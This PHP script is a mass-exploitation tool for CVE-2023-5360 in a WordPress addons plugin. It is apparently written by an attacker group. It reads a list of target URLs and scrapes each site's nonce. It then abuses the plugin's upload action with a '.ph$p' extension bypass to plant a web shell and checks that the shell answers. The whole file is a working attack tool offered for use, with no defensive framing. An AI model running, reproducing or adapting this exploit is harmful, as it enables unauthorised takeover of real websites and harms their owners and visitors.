<?php

# N4ST4R_ID | D704T Team
# If you want to use your own shell
# You have to change or delete the preg_match on line 99
# And change the shell path and name on line 95
# Shell ext must be .ph$p

function curl($url, $file = null, $nonce = null)
{
    $ch = curl_init();

    $curl_array = [
        CURLOPT_URL => $url,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 10
    ];

    if ($file && $nonce) {
        $postfileds = [
            "action" => "wpr_addons_upload_file",
            "uploaded_file" => $file,
            "max_file_size" => 0,
            "allowed_file_types" => "ph\$p",
            "triggering_event" => "click",
            "wpr_addons_nonce" => $nonce
        ];

        $curl_array[CURLOPT_POST] = true;
        $curl_array[CURLOPT_POSTFIELDS] = $postfileds;
    }

    $curl_array[CURLOPT_RETURNTRANSFER] = true;

    curl_setopt_array($ch, $curl_array);

    $exec = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    return (object) [
        "body" => $exec,
        "head" => $code
    ];
}

function getNonce($url)
{
    $request = curl($url);

    if (preg_match("/var\s+WprConfig\s*=\s*({.*?});/s", $request->body, $match)) {
        $nonce = json_decode($match[1], true);
        return $nonce["nonce"];
    } else {
        return false;
    }
}

function main($url, $file, $nonce)
{
    $url = "$url/wp-admin/admin-ajax.php";
    $request = curl($url, $file, $nonce);

    $jsonRes = json_decode($request->body, true);
    if ($jsonRes === null) {
        $json = str_replace("bool(false)\n", "", $request->body);
        $jsonRes = json_decode($json, true);
    }

    if ($jsonRes !== 0 && json_last_error() === JSON_ERROR_NONE && $jsonRes["success"] == true) {
        $shell = $jsonRes["data"]["url"];
        $check_shell = curl($shell);

        return ($check_shell->head == 200) ? $shell : false;
    } else {
        return false;
    }
}

echo "
____ __  __ ____ 
/ (__`\ \/ /| ===|-2023-5360
\____) \__/ |____| Vulnerable version <1.3.78
\n";

$list = readline("[!] Input file => ");
$file = (file_exists($list)) ? file_get_contents($list) : die("[!] File not found");
$urls = explode("\n", $file);

foreach ($urls as $url) {
    echo "\n[*] Exploiting $url";

    $nonce = getNonce($url);
    $shell = new CURLFile("up.ph\$p");
    if (getNonce($url) !== false) {
        $exploit = main($url, $shell, $nonce);

        if ($exploit !== false) {
            $shell = curl($exploit);
            echo ($shell->head == 200 && preg_match("/N4ST4R_ID/", $shell->body)) ? "\n[+] $exploit\n" : "\n[-] Shell failed\n";
        } else {
            echo "\n[-] Shell failed\n";
        }
    } else {
        echo "\n[-] Nonce not found\n";
    }
}
